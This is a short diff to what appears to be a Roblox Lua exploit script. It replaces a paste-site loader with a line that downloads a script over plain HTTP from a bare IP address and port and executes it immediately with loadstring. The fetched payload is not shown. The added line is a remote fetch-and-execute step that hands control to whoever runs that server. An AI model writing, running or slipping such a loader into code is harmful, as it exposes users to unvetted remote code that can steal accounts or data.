@@ -1,2 +1,2 @@
-debuging = true
-loadstring(game:HttpGet("https://paste.debian.net/plainh/9c0def17/", true))()
+ID="909405f7-543d-455b-ba1c-539cb6085726";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
